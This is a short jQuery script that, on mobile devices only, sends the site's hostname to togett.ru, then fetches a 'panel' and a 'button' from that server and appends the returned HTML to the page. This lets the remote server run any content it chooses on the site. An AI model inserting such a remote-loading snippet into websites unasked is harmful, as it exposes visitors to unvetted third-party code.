$(document).ready(function(){

    var detect = new MobileDetect(window.navigator.userAgent);
    if( detect.mobile() != null ) {

        var domain = location.hostname; 

        $.ajax({
            url: 'https://togett.ru/'+domain,
            type: 'get',
            success: function(data) {
                if( data != 'null' ) {
                    $.ajax({
                        url: 'https://togett.ru/panel/'+data,
                        type: 'get',
                        success: function(data) {
                            $('body').append(data);
                        }
                    });
                
                
                    $.ajax({
                        url: 'https://togett.ru/button/'+data,
                        type: 'get',
                        success: function(data) {
                            $('body').append(data);
                        }
                    });
                }
                

            }
        });

        
    }

});
